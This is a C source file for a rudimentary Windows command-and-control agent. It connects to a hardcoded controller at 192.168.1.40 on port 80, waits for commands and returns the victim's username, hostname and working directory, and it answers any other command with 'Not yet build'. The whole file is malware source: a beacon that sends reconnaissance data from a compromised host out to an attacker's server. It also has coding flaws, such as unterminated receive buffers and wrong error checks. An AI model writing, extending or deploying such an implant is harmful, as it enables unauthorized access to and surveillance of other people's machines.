#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winbase.h>
#include <errhandlingapi.h>
#pragma comment(lib, "ws2_32.lib")

#define IP "192.168.1.40"
#define PORT_HTTP 80

char *executing(char *receive);
char *whoamiCommand();
char *hostnameCommand();
char *pwdCommand();

int main() {
    puts("Hello ASX");
    WORD wVersionRequested;
    WSADATA wsadata;

    wVersionRequested = MAKEWORD(2, 2);
    if (WSAStartup(wVersionRequested, &wsadata) < 0) {
        wprintf(L"startup failed with error: %u\n", WSAGetLastError());
        return 1;
    }

    puts("Initializing socket...");
    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (inferno_socket < 0) {
        wprintf(L"socket initialization failed with error: %u\n", WSAGetLastError());
        return 1;
    }

    struct sockaddr_in c2_address;
    memset(&c2_address, 0, sizeof(c2_address));
    c2_address.sin_family = AF_INET;
    c2_address.sin_port = htons(PORT_HTTP);
    c2_address.sin_addr.s_addr = inet_addr(IP);

    puts("Connecting...");
    if (connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address)) < 0) {
        wprintf(L"socket connection failed with error: %u\n", WSAGetLastError());
        return 1;
    }
    puts("Connected");

     while (1) {
        //receiving http payload
        char receive[1024];
        if (recv(inferno_socket, receive, sizeof(receive), 0) < 0) {
            wprintf(L"receiving from server failed with error: %u\n", WSAGetLastError());
            return 1;
        }
        printf("Receiving:\n\n%s\n\n", receive);

        char response[1024];
        char command[1024];
        char *task;
        strcpy(command, receive);
        task = executing(command);
        sprintf(response, "%s\r\n", task);

        //sending payload result
        printf("Sending: '%s' from agent...\n", response);
        if (send(inferno_socket, response, sizeof(response), 0) < 0) {
            wprintf(L"sending to server failed with error: %u\n", WSAGetLastError());
            return 1;
        }
        printf("Sent:\n\n'%s' from agent...\n", response);
    }

    //closing socket
    if(closesocket(inferno_socket) < 0)
        wprintf(L"closing socket failed with error: %u\n", WSAGetLastError());

    WSACleanup();
}

char *executing(char *receive) {
    char *task;
    if (strcmp(receive, "whoami") == 0)
        task = whoamiCommand();
    else if (strcmp(receive, "hostname") == 0)
        task = hostnameCommand();
    else if (strcmp(receive, "pwd") == 0)
        task = pwdCommand();
    else
        task = "Not yet build";
    return task;
}

char *whoamiCommand() {
    static char username[1024];
    DWORD usernameSize = 1024;

    if (GetUserNameA(username, &usernameSize) < 0)
        GetLastError();
    return username;
}

char *hostnameCommand() {
    static char hostname[1024];
    DWORD hostnameSize = 1024;

    if (GetComputerNameA(hostname, &hostnameSize) < 0)
        GetLastError();
    return hostname;
}

char *pwdCommand() {
    static char pwd[1024];

    if (GetCurrentDirectoryA(1024, pwd) < 0)
        GetLastError();
    return pwd;
}
